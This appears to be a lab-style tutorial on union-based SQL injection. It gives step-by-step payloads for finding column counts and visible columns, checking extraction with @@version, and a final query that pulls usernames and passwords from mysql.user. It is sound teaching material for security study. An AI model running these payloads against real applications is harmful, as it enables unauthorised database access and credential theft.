# Union Injection

Union-based injection follows a three-step process: confirm the injection point, determine the column count, then identify which columns are rendered on the page. Only after all three are established can you reliably extract data.

***

## Step 1: Confirming the Injection Point

Submit a single quote to the vulnerable parameter and observe the response:

```
http://SERVER_IP:PORT/search.php?port_code=cn'
```

A SQL syntax error confirms the input is passed directly into a query without sanitisation. An error here means Union injection is viable because the application returns query results visibly.

***

## Step 2: Determining Column Count

Two methods exist. Use whichever is more comfortable, both arrive at the same answer.

### Method A: ORDER BY (increments until error)

```sql
' ORDER BY 1-- -    -- success
' ORDER BY 2-- -    -- success
' ORDER BY 3-- -    -- success
' ORDER BY 4-- -    -- success
' ORDER BY 5-- -    -- ERROR: column 5 doesn't exist
```

The last successful number (4) is the column count. ORDER BY is reliable because it errors only when the column number exceeds the actual count, and does not require knowing the data types.

### Method B: UNION SELECT (increments until success)

```sql
cn' UNION SELECT 1,2,3-- -      -- ERROR: column count mismatch
cn' UNION SELECT 1,2,3,4-- -    -- success: 4 columns confirmed
```

This method errors until the count is correct, the inverse of ORDER BY. Both methods confirm 4 columns in this example.

| Method | Direction | Confirmed When |
|--------|-----------|---------------|
| ORDER BY | Increments to error | Last success = column count |
| UNION SELECT | Increments to success | First success = column count |

***

## Step 3: Finding Displayed Columns

A query can return 4 columns but only render 2 or 3 on the page. Injecting numbers as placeholders reveals exactly which positions are visible:

```sql
cn' UNION SELECT 1,2,3,4-- -
```

If the page shows `2`, `3`, and `4` but not `1`, column 1 is used internally (likely an ID field) but not displayed. Any data placed in column 1 will never appear in the output, making it useless as an injection position.

This is the entire reason for using numbers as filler: they appear verbatim in the output, making it immediately obvious which column positions map to visible page elements.

***

## Step 4: Validating with a Real Query

Replace one of the visible column numbers with an actual SQL expression to confirm data extraction works:

```sql
cn' UNION SELECT 1,@@version,3,4-- -
```

If the database version string appears on the page where `2` previously showed, the injection is fully functional. Common test values:

| Expression | Returns |
|-----------|---------|
| `@@version` | MySQL version string |
| `@@datadir` | Database file storage path |
| `user()` | Current database user |
| `database()` | Currently selected database |
| `'test'` | Literal string, confirms string output |

***

## The Complete Workflow Visualised

```
1. Inject: cn'
   → SQL error = vulnerable

2. Inject: ' ORDER BY 1,2,3,4-- - (4 succeeds, 5 errors)
   → 4 columns confirmed

3. Inject: cn' UNION SELECT 1,2,3,4-- -
   → Numbers 2,3,4 visible on page (column 1 hidden)

4. Inject: cn' UNION SELECT 1,@@version,3,4-- -
   → MySQL version appears = extraction confirmed

5. Extract target data:
   cn' UNION SELECT 1,username,password,4 FROM mysql.user-- -
```

***

## Practical Notes

The `-- -` comment format (two dashes, space, dash) is used throughout to make the trailing space explicit. In URL parameters, this becomes `--+-` or `--+` since spaces encode as `+` in query strings. The `#` comment (`%23` URL-encoded) is a cleaner alternative in GET parameters:

```
?port_code=cn' UNION SELECT 1,@@version,3,4%23
```

Column 1 being hidden is a common pattern because most tables include an `id` column used to join tables together that has no meaningful display value to the end user. Always run the number-filler step before attempting data extraction: placing your payload in a hidden column will produce no output and waste time debugging a working injection that simply cannot be seen.
